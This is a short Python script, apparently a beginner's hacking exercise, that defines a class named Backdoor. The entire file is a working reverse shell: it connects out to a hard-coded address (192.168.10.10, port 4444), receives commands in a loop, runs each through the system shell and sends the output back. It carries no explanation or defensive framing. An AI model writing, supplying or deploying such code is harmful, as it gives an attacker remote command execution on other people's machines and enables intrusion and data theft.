#!usr/bin/python

from sqlite3 import connect
import subprocess
import socket
from unittest import result

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def exe_remort_command(self,command):
        return subprocess.check_output(command,shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            result = self.exe_remort_command(command.decode())
            self.connection.send(result)
        
ip = "192.168.10.10"
port = 4444

backdoor = Backdoor(ip,port)
backdoor.run()